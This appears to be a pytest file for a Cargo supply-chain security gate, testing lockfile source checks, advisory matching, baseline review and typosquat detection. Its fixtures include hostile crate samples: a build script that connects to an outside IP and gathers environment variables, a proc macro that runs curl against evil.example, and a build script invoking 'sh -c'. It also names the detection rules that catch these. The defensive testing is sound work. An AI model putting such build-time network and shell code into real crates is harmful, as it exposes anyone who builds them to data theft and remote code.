"""security/supply_chain_cargo.py, offline: Cargo.lock sources, semver
requirements of RustSec advisories, crafted .crate files (build scripts
that reach the network, proc macros that start programs, bundled
libraries), the baseline comparison and the fail-closed advisory sources."""

from __future__ import annotations

import hashlib
import io
import json
import sys
import tarfile
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from security import supply_chain_cargo as C  # noqa: E402
from security.supply_chain_gate import GateError  # noqa: E402

CRATES_IO = "registry+https://github.com/rust-lang/crates.io-index"
SUM = "a" * 64


def make_crate(path: Path, name: str, version: str, members: dict[str, bytes], *, raw: dict[str, bytes] | None = None) -> Path:
    with tarfile.open(path, "w:gz") as tf:
        for rel, data in list(members.items()):
            info = tarfile.TarInfo(f"{name}-{version}/{rel}")
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
        for full, data in (raw or {}).items():
            info = tarfile.TarInfo(full)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return path


def lock_text(*packages: str) -> str:
    return "version = 4\n\n" + "\n".join(packages)


def pkg(name: str, version: str, source: str | None = CRATES_IO, checksum: str | None = SUM) -> str:
    out = f'[[package]]\nname = "{name}"\nversion = "{version}"\n'
    if source:
        out += f'source = "{source}"\n'
    if checksum:
        out += f'checksum = "{checksum}"\n'
    return out


@pytest.fixture
def project(tmp_path, monkeypatch):
    monkeypatch.setattr(C, "BASELINE_DIR", tmp_path / "baseline")
    monkeypatch.setattr(C, "CACHE_DIR", tmp_path / "cache")
    monkeypatch.setattr(C, "OWN", {"me"})
    monkeypatch.setattr(C, "LOCK", tmp_path / "Cargo.lock")
    return tmp_path


# --- versions -----------------------------------------------------------------------------

@pytest.mark.parametrize("version, req, expected", [
    ("1.2.3", ">= 1.2.3", True), ("1.2.2", ">= 1.2.3", False),
    ("0.5.9", "^0.5.1", True), ("0.6.0", "^0.5.1", False), ("0.5.0", "^0.5.1", False),
    ("1.9.0", "^1.2", True), ("2.0.0", "^1.2", False), ("0.0.4", "^0.0.3", False),
    ("1.2.9", "~1.2.3", True), ("1.3.0", "~1.2.3", False),
    ("0.2.4", ">= 0.2.0, < 0.2.5", True), ("0.2.5", ">= 0.2.0, < 0.2.5", False),
    ("1.0.0-alpha.1", ">= 1.0.0", False), ("1.0.0", "= 1.0.0", True), ("1.0.1", "1.0.0", True),
    ("0.9.0", "< 0.1.0", False), ("0.0.9", "< 0.1.0", True), ("4.1.0", "4.*", True),
])
def test_happy_semver_requirements_of_advisories(version, req, expected):
    assert C.matches(version, req) is expected


def test_sad_an_unreadable_requirement_counts_as_affected():
    db = {"x": [{"id": "RUSTSEC-1", "kind": "vulnerability", "title": "t", "patched": ["what is this"],
                 "unaffected": [], "withdrawn": None}]}
    assert [h["id"] for h in C.rustsec_hits(db, "x", "1.0.0")] == ["RUSTSEC-1"]


# --- the lock -------------------------------------------------------------------------------

def test_sad_git_path_and_other_registry_sources_are_problems(project):
    C.LOCK.write_text(lock_text(
        pkg("me", "0.1.0", None, None), pkg("good", "1.0.0"),
        pkg("fromgit", "1.0.0", "git+https://github.com/x/y?rev=abc#abc", None),
        pkg("vendored", "1.0.0", None, None),
        pkg("other", "1.0.0", "registry+https://my.registry/index"),
        pkg("nosum", "1.0.0", CRATES_IO, None)))
    pins, problems = C.read_lock()
    assert [p.name for p in pins] == ["good"]
    text = " ".join(p.line() for p in problems)
    assert "fromgit" in text and "git" in text
    assert "vendored" in text and "path package" in text
    assert "other" in text and "my.registry" in text
    assert "nosum" in text and "no checksum" in text
    assert "me:" not in text


# --- content --------------------------------------------------------------------------------

def test_sad_a_build_script_that_reaches_the_network_is_a_high_finding(tmp_path):
    crate = make_crate(tmp_path / "x.crate", "evil", "1.0.0", {
        "Cargo.toml": b'[package]\nname = "evil"\nversion = "1.0.0"\nbuild = "build.rs"\n',
        "build.rs": b'use std::net::TcpStream;\nfn main() { let s = TcpStream::connect("203.0.113.9:80"); '
                    b'let v: Vec<_> = std::env::vars().collect(); }\n',
        "src/lib.rs": b"pub fn f() {}\n"})
    report = C.inspect_crate(str(crate), "evil", "1.0.0")
    assert report.build_scripts == {"build.rs": report.files["build.rs"]}
    rules = {(f.rule, f.severity) for f in report.findings}
    assert ("rs-network", "high") in rules and ("rs-env-dump", "high") in rules


def test_happy_the_same_lines_in_ordinary_code_are_no_finding(tmp_path):
    crate = make_crate(tmp_path / "x.crate", "net", "1.0.0", {
        "Cargo.toml": b'[package]\nname = "net"\nversion = "1.0.0"\n',
        "src/lib.rs": b"use std::net::TcpStream;\npub fn f() { let _ = TcpStream::connect(\"a:1\"); }\n"})
    report = C.inspect_crate(str(crate), "net", "1.0.0")
    assert not report.build_scripts and not report.findings


def test_sad_a_proc_macro_that_starts_curl_and_a_bundled_binary(tmp_path):
    ar = b"!<arch>\n" + b"lib.o/".ljust(16) + b"0".ljust(12) + b"0".ljust(6) + b"0".ljust(6) + \
        b"644".ljust(8) + b"4".ljust(10) + b"`\n" + b"\x00\x01\x02\x03"
    crate = make_crate(tmp_path / "x.crate", "pm", "1.0.0", {
        "Cargo.toml": b'[package]\nname = "pm"\nversion = "1.0.0"\n[lib]\nproc-macro = true\n',
        "src/lib.rs": b'fn x() { std::process::Command::new("curl").arg("https://evil.example/p").status(); }\n',
        "lib/libthing.a": ar, "bin/tool": b"\x7fELF" + b"\0" * 60,
        "csrc/a.c": b"int a;\n", "csrc/a.h": b"int a;\n"})
    report = C.inspect_crate(str(crate), "pm", "1.0.0")
    assert report.proc_macro
    assert ("rs-download-tool", "high") in {(f.rule, f.severity) for f in report.findings}
    assert report.native == {"lib/libthing.a": "ar", "bin/tool": "elf"}
    assert report.native_profiles["lib/libthing.a"] == ["lib.o"]
    assert report.native_sources == {"csrc": 2}


def test_sad_a_member_outside_the_crate_folder_is_an_error(tmp_path):
    crate = make_crate(tmp_path / "x.crate", "a", "1.0.0", {"Cargo.toml": b"[package]\n"},
                       raw={"elsewhere/evil.rs": b"x"})
    assert any("outside" in e for e in C.inspect_crate(str(crate), "a", "1.0.0").errors)


def test_happy_an_import_library_names_its_dlls():
    body = b"\x00\x00\xff\xff" + b"\0" * 16 + b"CreateFileW\0kernel32.dll\0"
    member = b"k.o/".ljust(16) + b"0".ljust(12) + b"0".ljust(6) + b"0".ljust(6) + b"644".ljust(8) + \
        str(len(body)).encode().ljust(10) + b"`\n" + body
    assert C.ar_names(b"!<arch>\n" + member) == ["dll:kernel32.dll", "(0 objects)"]


# --- the gate -----------------------------------------------------------------------------------

def _checker(tmp_path, members):
    crate = make_crate(tmp_path / "good-1.0.0.crate", "good", "1.0.0", members)

    def check(pin, **_):
        r = C.CrateResult(pin=pin, path=str(crate), meta={"published_by": "alice", "created_at": "2020-01-01T00:00:00Z"})
        r.report = C.inspect_crate(str(crate), pin.name, pin.version)
        return r
    return check


MEMBERS = {"Cargo.toml": b'[package]\nname = "good"\nversion = "1.0.0"\n', "src/lib.rs": b"pub fn f() {}\n"}


def _run(advisories=None, checker=None):
    return C.run_check(top=[], checker=checker,
                       advisories=lambda pins, **k: [list(advisories or []) for _ in pins])


def test_sad_a_crate_never_reviewed_fails_and_passes_once_accepted(project):
    C.LOCK.write_text(lock_text(pkg("good", "1.0.0")))
    checker = _checker(project, MEMBERS)
    results, general = _run(checker=checker)
    assert [p.check for p in results[0].problems] == ["baseline"]
    C.save_baseline(C.baseline_entry(results[0], "me", "read it all", {}), {("good", "1.0.0")})
    results, general = _run(checker=checker)
    assert not general and not results[0].problems


def test_sad_changed_content_or_publisher_fails_against_the_baseline(project):
    C.LOCK.write_text(lock_text(pkg("good", "1.0.0")))
    results, _ = _run(checker=_checker(project, MEMBERS))
    C.save_baseline(C.baseline_entry(results[0], "me", "read it all", {}), {("good", "1.0.0")})
    evil = dict(MEMBERS, **{"build.rs": b'fn main(){ std::process::Command::new("sh").arg("-c").status(); }'})
    (project / "v2").mkdir()
    results, _ = _run(checker=_checker(project / "v2", evil))
    lines = " ".join(p.line() for p in results[0].problems)
    assert "members differ" in lines and "rs-shell" in lines


def test_sad_advisories_vulnerabilities_fail_notices_need_a_reason(project):
    C.LOCK.write_text(lock_text(pkg("good", "1.0.0")))
    checker = _checker(project, MEMBERS)
    results, _ = _run(checker=checker)
    C.save_baseline(C.baseline_entry(results[0], "me", "read it all", {}), {("good", "1.0.0")})
    vuln = {"id": "RUSTSEC-1", "kind": "vulnerability", "title": "overflow", "source": "rustsec", "aliases": []}
    note = {"id": "RUSTSEC-2", "kind": "unmaintained", "title": "gone", "source": "rustsec", "aliases": []}
    mal = {"id": "MAL-1", "kind": "malicious", "title": "", "source": "osv", "aliases": []}
    for adv, check in ((vuln, "vulnerability"), (note, "unmaintained"), (mal, "MALICIOUS")):
        results, _ = _run([adv], checker)
        assert any(check in p.message for p in results[0].problems), adv
    entry = C.load_baseline("good", "1.0.0")
    entry["accepted_advisories"] = {"RUSTSEC-2": "the crate is feature complete; read and fine"}
    C.save_baseline(entry, {("good", "1.0.0")})
    results, _ = _run([note], checker)
    assert not results[0].problems
    results, _ = _run([mal], checker)
    assert results[0].problems


def test_sad_without_any_advisory_source_the_gate_fails_closed(monkeypatch):
    def down(*a, **k):
        raise GateError("unreachable")
    monkeypatch.setattr(C, "rustsec_db", down)
    monkeypatch.setattr(C, "osv_hits", down)
    with pytest.raises(GateError, match="neither"):
        C.advisories_for([C.CratePin("a", "1.0.0", CRATES_IO, SUM)], require_osv=False, notes=[])
    monkeypatch.setattr(C, "rustsec_db", lambda *a, **k: {})
    with pytest.raises(GateError, match="require-osv"):
        C.advisories_for([C.CratePin("a", "1.0.0", CRATES_IO, SUM)], require_osv=True, notes=[])
    notes: list[str] = []
    assert C.advisories_for([C.CratePin("a", "1.0.0", CRATES_IO, SUM)], require_osv=False, notes=notes) == [[]]
    assert any("OSV could not" in n for n in notes)


def test_happy_rustsec_advisories_are_read_from_the_database_archive(monkeypatch):
    def advisory(crate, vid, extra=""):
        return (f'```toml\n[advisory]\nid = "{vid}"\npackage = "{crate}"\ndate = "2024-01-01"\n{extra}\n'
                f'[versions]\npatched = [">= 1.5.0"]\n```\n\n# {vid} title\n').encode()
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for path, data in (("advisory-db-main/crates/foo/RUSTSEC-1.md", advisory("foo", "RUSTSEC-1")),
                           ("advisory-db-main/crates/foo/RUSTSEC-2.md", advisory("foo", "RUSTSEC-2", 'informational = "unmaintained"')),
                           ("advisory-db-main/crates/foo/RUSTSEC-3.md", advisory("foo", "RUSTSEC-3", 'withdrawn = "2024-02-01"'))):
            info = tarfile.TarInfo(path)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    monkeypatch.setattr(C, "_get", lambda *a, **k: buf.getvalue())
    db = C.rustsec_db(minimum=1)
    hits = C.rustsec_hits(db, "foo", "1.4.0")
    assert {(h["id"], h["kind"]) for h in hits} == {("RUSTSEC-1", "vulnerability"), ("RUSTSEC-2", "unmaintained")}
    assert C.rustsec_hits(db, "foo", "1.5.0") == []


def test_happy_one_advisory_under_several_ids_is_one_entry():
    merged = C.merge_advisories(
        [{"id": "RUSTSEC-1", "kind": "unmaintained", "title": "t", "source": "rustsec", "aliases": ["GHSA-x"]}],
        [{"id": "GHSA-x", "kind": "vulnerability", "title": "t", "source": "osv", "aliases": ["RUSTSEC-1"]}])
    assert len(merged) == 1 and merged[0]["source"] == "osv,rustsec"


def test_sad_typosquatted_crate_names_but_not_a_family_of_the_lock():
    top = ["serde", "serde_json", "tokio"]
    pins = [C.CratePin(n, "1.0.0", CRATES_IO, SUM) for n in ("serde_jsonn", "tokio", "tokio-macros", "toklo")]
    names = {p.package for p in C.name_problems(pins, top)}
    assert names == {"serde_jsonn", "toklo"}


def test_happy_the_index_path_of_crates_io():
    assert [C.index_path(n) for n in ("a", "ab", "syn", "serde")] == ["1/a", "2/ab", "3/s/syn", "se/rd/serde"]


def test_sad_a_download_with_another_checksum_is_refused(project, monkeypatch):
    monkeypatch.setattr(C, "_get", lambda *a, **k: b"something else")
    with pytest.raises(GateError, match="checksum"):
        C.download(C.CratePin("a", "1.0.0", CRATES_IO, hashlib.sha256(b"the real one").hexdigest()))


def test_happy_the_report_names_build_time_code(project, tmp_path):
    C.LOCK.write_text(lock_text(pkg("good", "1.0.0")))
    results, general = _run(checker=_checker(project, dict(MEMBERS, **{"build.rs": b"fn main(){}"})))
    C.write_report(results, general, tmp_path / "r", ["advisories from RustSec"])
    text = (tmp_path / "r" / "SUPPLY-CHAIN-CARGO.md").read_text()
    assert "FAILED" in text and "good 1.0.0: build script" in text
    assert json.loads((tmp_path / "r" / "SUPPLY-CHAIN-CARGO.json").read_text())["passed"] is False


def test_happy_a_prebuilt_coff_object_names_what_it_calls_outside_itself():
    import struct

    strings = b"ring_core_long_internal_name\0"
    symbols = b"".join([
        b"\0\0\0\0" + struct.pack("<I", 4) + struct.pack("<IhHBB", 0, 0, 0, 2, 0),   # external, undefined (long name)
        b"local\0\0\0" + struct.pack("<IhHBB", 0, 1, 0, 2, 0),                      # defined in section 1
    ])
    header = struct.pack("<HHIIIHH", 0x8664, 1, 0, 20, 2, 0, 0)
    data = header + symbols + struct.pack("<I", 4 + len(strings)) + strings
    assert C.coff_undefined(data) == ["undefined:ring_core_long_internal_name"]
    assert C.coff_undefined(b"\x64\x86") == ["(no COFF symbol table)"]
